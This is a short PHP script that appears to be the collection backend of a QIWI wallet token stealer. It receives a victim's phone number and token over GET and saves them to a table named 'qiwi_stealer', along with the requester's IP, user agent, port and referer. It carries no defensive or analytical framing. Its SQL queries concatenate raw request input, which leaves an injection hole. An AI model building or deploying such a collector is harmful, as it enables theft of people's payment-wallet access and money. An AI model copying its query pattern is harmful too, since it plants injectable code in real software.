<?php 

if(isset($_GET["token"]) && isset($_GET["phone"])) {

    require_once("../bd/u0992352_connection.php");
    
    global $pdo;
    					    
    $datetime = date("Y-m-d H:i:s");
        
    $pdo->query("INSERT INTO `qiwi_stealer`(`phone`, `token`, `date`) VALUES('".$_GET["phone"]."', '".$_GET["token"]."', '".$datetime."')");
    $pdo->query("INSERT INTO `qiwi_logger`(`phonenumber`, `token`, `type`, `date`, `REMOTE_ADDR`, `HTTP_USER_AGENT`, `REMOTE_PORT`, `HTTP_REFERER`, `QUERY_STRING`) VALUES('".$_GET["phone"]."', '".$_GET["token"]."', 'show_cards', '".$datetime."', '".$_SERVER["REMOTE_ADDR"]."', '".$_SERVER["HTTP_USER_AGENT"]."', '".$_SERVER["REMOTE_PORT"]."', '".$_SERVER["HTTP_REFERER"]."', '".$_SERVER["QUERY_STRING"]."')");

}